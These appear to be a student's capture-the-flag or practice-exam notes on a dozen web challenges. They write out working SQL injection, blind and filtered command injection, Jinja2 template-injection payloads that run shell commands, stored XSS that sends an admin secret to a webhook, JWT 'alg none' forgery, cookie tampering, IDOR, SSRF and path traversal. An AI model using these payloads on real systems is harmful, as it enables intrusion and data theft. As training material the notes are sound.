# Challenge C01

## Flag

`offsec{logic_8e905859d1068133}`

## Attack surface and discovery

Request: POST to / for login, payload in the body: username=alice&password=alice123
Get a session cookie, http-only: Set-Cookie: session=eyJ1aWQiOjF9.ajWekg.k2AR-_j83fyzBX6_Va5WUBnrtb4; HttpOnly; 
The first part is: {"uid":1} in base 64, the rest seems randomic.

when i send post to /checkout: 
item_id=99&price=5000&discount=100&voucher=aaa

also when i go to an invoice with post/invoice/n with a GET, i can change n and see other users invoice

this is all client data.

## Vulnerability and root cause
Server trusts user supplied data.
## Exploitation primitive
I can change invoice id (IDOR), then change item id and price or discount
## Full exploit chain
capture request with burp, change the Get to invoice/3, get the Voucher code: ROOT-99, then intercept a POST to /checkout, change body in the post request to get a price of 0 and with that voucher code, to item 99

## Evidence / relevant HTTP requests

## Correct server-side mitigation
Never trust user supplied data without verification, verify that user can access that specific id (check authorization + prices on the server)
____________________________

# Challenge C02

## Flag

`offsec{...}`

## Attack surface and discovery
first part similar to last one. Post to / with credentials in the body: username=operator&password=operator123
get back a cookie: Set-Cookie: profile=eyJ1c2VyIjogIm9wZXJhdG9yIiwgInJvbGUiOiAib3BlcmF0b3IifQ; 
which base64 decoded is: {"user": "operator", "role": "operator"}
## Vulnerability and root cause
the cookie contains authorization data and it's not encrypted, it's client side so it can be modified and the server trusts client-side data
## Exploitation primitive
change the cookie to: admin, admin
## Full exploit chain

## Evidence / relevant HTTP requests

## Correct server-side mitigation
_____________
# Challenge C03

## Flag

`offsec{jwt_61ce69bb95b9dc3a}`

## Attack surface and discovery
like before, POST to / with credentials in the body. Get a JWT back: 
Set-Cookie: access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ2aWV3ZXIiLCJyb2xlIjoidmlld2VyIn0.owa9HPryN0qodPQ44skR4ETW_B6fPLdQ52oLzJuKCcM; HttpOnly;
{
    "typ": "JWT",
    "alg": "HS256"
}

{
    "sub": "viewer",
    "role": "viewer"
}+ signature
## Vulnerability and root cause
when i try to get to /admin it checks my cookie, but i can change the alg to noone so that the signature is not checked (from burp)
## Exploitation primitive

## Full exploit chain
capture the request on burp, change the header field alg: to none.
## Evidence / relevant HTTP requests

## Correct server-side mitigation
check algorithm type (allow only a specific set), always check signature
________________________________

# Challenge C04

## Flag

`offsec{union_sqli_6c4ce94bf3c1d6a4}`

## Attack surface and discovery
form where i can send a get with query parameter ?category=...
## Vulnerability and root cause
doesn't use prepared statements on the server
## Exploitation primitive

## Full exploit chain
' or 1=1-- -    : works
' union select NULL, NULL, NULL, NULL-- -   : there are 4 parameters to select
' union select sqlite_version(),2,3,4-- -   : it's using sqlite
' union SELECT name, 2, 3, 4 FROM sqlite_master WHERE type='table'-- -  : articles and vault_records
' union SELECT sql, 2, 3, 4 FROM sqlite_master WHERE type='table' AND name='vault_records'-- -  : CREATE TABLE vault_records(code TEXT,owner TEXT,secret TEXT)
' union SELECT code, owner, secret, 4 from vault_records-- -    : offsec{union_sqli_6c4ce94bf3c1d6a4}
## Evidence / relevant HTTP requests

## Correct server-side mitigation
___________________________________

# Challenge C05

## Flag

`offsec{...}`

## Attack surface and discovery
GET to /api/lookup?id=1

with id=0 or >3 i get: {"marker":"ORBIT-RED","status":"missing"}
with id = 1,2,3 i get: {"marker":"ORBIT-GREEN","status":"exists"}
## Vulnerability and root cause
can use the server as an oracle with sql injection: blind sqli
1 and 1=1-- -   : i get the exists
1 and 1=2-- -   : i get the missing
1 and SUBSTR( (SELECT group_concat(name) FROM sqlite_master WHERE type='table'), 1, 1)='d'-- -
1 AND UNICODE(SUBSTR((SELECT group_concat(name) FROM sqlite_master WHERE type='table'),1,1))>99 -- -

....
## Exploitation primitive

## Full exploit chain

## Evidence / relevant HTTP requests

## Correct server-side mitigation

______________________________

C06:

reload with preference cookie set: 
Cookie: prefs=eyJjYXRlZ29yeSI6ICJvZmZpY2UifQ -> decoded from base64: {"category": "office"}
can sqli in cookie which is a json object base64 encoded.
"category": "' or 1=1-- -"
' UNION SELECT 1,2-- -
' union select sqlite_version(),2-- -   : it's using sqlite
' union SELECT name, 2, FROM sqlite_master WHERE type='table'-- -  
...

___________________

C07:
command injection: GET /check?host=127.0.0.1

try: 127.0.0.1; ls;# -> error: rejected
a filter blocks |, &, ;, and spaces (can bypass with ${IFS})
&(ls): {"output":"checked:Dockerfile README.md app.py requirements.txt\n"}
$(ls${IFS}-a${IFS}/) :  {"output":"checked:. .. .dockerenv app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var\n"}
$(ls${IFS}-a${IFS}/run): {"output":"checked:. .. challenge lock\n"}
$(ls${IFS}-a${IFS}/run/challenge): {"output":"checked:. .. flag.txt\n"}
$(cat${IFS}/run/challenge/flag.txt): {"output":"checked:offsec{command_312e2fb1d441adba}\n"}

__________________

C08:
blind command injection
avoid spaces with ${IFS}

; sleep 5; #
; [ ${#FLAG} = 42 ] && sleep 5; #            ;${IFS}[${IFS}${#FLAG}${IFS}<${IFS}42${IFS}]${IFS}&&${IFS}sleep${IFS}2;${IFS}#
;[ x$(cat /run/challenge/flag.txt|cut -c1-6) = xoffsec ]&&sleep 5;#     ;[${IFS}x$(cat${IFS}/run/challenge/flag.txt|cut${IFS}-c1-6)${IFS}=${IFS}xoffsec${IFS}]&&sleep${IFS}5;#

_______________

C09

Hello + name, which i can pass as query parameter when i request the page with GET /
XSS. But also SSTI (Template injection), with {{2*2}} i get "Hello 4". XSS not useful because sandboxed in the browser, can't access anything useuful
Need to access the flag, need to execute a shell with popen, by using code injection with Jinja2

the server uses render_template_string() is a Flask helper that takes a string and renders it as a Jinja2 template.
 template='<h1>Hello '+name+'</h1><p>Template preview service</p>'
 try:return render_template_string(template)

So i can inject a Jinja2 payload, wich uses 
{{ var }} for variable, 
{% for a in (1,10)  %} ... {% endfor %} for loops
...

to debug try:
{{ ''.__class__ }}
{{ ''.__class__.__mro__[1] }}  to get object
{{ ''.__class__.__mro__[1].__subclasses__()|length }}
{% for c in ''.__class__.__mro__[1].__subclasses__()[:490] %}{{ loop.index0 }} - {{ c }}<br>{% endfor %}
<class 'warnings.catch_warnings'>, <class 'os._wrap_close'>, <class 'werkzeug._internal._Missing'>

use 155 - <class 'os._wrap_close'>

{{ ''.__class__.__mro__[1].__subclasses__()[155].__init__.__globals__['os'].popen('cat /flag').read()}}

DOSNT WORK. BETTER USE: 
. cycler is a stable imported object

It’s part of the template engine ecosystem (Jinja/Matplotlib dependency chain depending on environment).

So it is:

always present
always imported in Python context
not dependent on subclass indexing

cycler.__init__.__globals__.os.popen('cat /flag').read()

___________________________

C10: XSS
if i try <script>alert(1)</script> in the form body and send it, it's stored on the server with the POST to /create
Then i can access it with GET /note/id.

So i can create a note with:
<script>fetch('/admin/secret').then(r=> r.text()).then(t=> fetch('webhook?t='+t))</script> -> this works
might need to encode t, encodeURIComponent(t)

or i can make him send a post to my collector so i read it from my dashboard without the webhook
so instead of fetch('webhook?t='+t):

fetch('/collector/my_token', {method:'POST', credentials: "include", body: t})

and then read the flag from my page.
<script>fetch('/admin/secret').then(r=> r.text()).then(t=> fetch('/collector/UAEHVhm4hldLpuYO', {method:'POST', credentials: "include", body: t}) )</script> -> this also works, see it in the collector tab.
_________________

C11: blocks internal requests (127.0.0.1) but not request to the specific ip address of the container, which can be resolved by an internal DNS server in docker as:
http://c11_internal

so i can use: http://c11_internal:5000/admin/secret instead of http://127.0.0.1:8211/admin/secret

127.0.0.1 never escapes the current machine/container
c11_internal resolves consistently inside Docker network containers, but it does not automatically resolve from the host in normal setups unless explicitly exposed.

_______________________

C12: after login as guest, guest123
i get session cookie back: session=eyJ1c2VyIjoiZ3Vlc3QifQ.ajZ6kg.EgccsVXLEQ-Fl27VoHq6frs6wTc; HttpOnly; Path=/ 
which is base64 encoded of: {"user":"guest"} and then gibberish.

i can send a post to /reset with body: username=a&token=b&new_password=c 
to reset a password i suppose

i can access to /api/message/id

and see messages of others even if i'm not the owner: {"body":"Emergency reset token: AuV5Lmbq9cAMWzMXrAbxbis9","owner":"admin","subject":"Recovery"}
so i can use it as a token to reset the password:
post to /reset with body: username=admin&token=AuV5Lmbq9cAMWzMXrAbxbis9&new_password=admin123
then access as admin and get a valid session cookie for admins.
in the admin view i can access to /admin.
Then access files, like /admin/view?name=report.txt
i access as file name: "../../../flag" -> offsec{mock_exam_22ca1a81fad5c8b5}

in fact the server used: return send_file(os.path.join('/app/reports',request.args.get('name','public.txt')))

__________________________

B01:
login as victim, victim123. Get a session cookie back: session=eyJ1c2VyIjoiYWRtaW4ifQ.ajZ8ZQ.sVlWg-21sMRSgKp09uAnyvV3xBk
which is base64 encoded version of {"ok": 1}. gibberish
There is a form to change a email: post to /change-email, email inside the body: email=...
just change it to my email attacker@local

the reality example: there is no CSRF token in that form, so i can send to the victim a crafted link that send the post to /change email with my email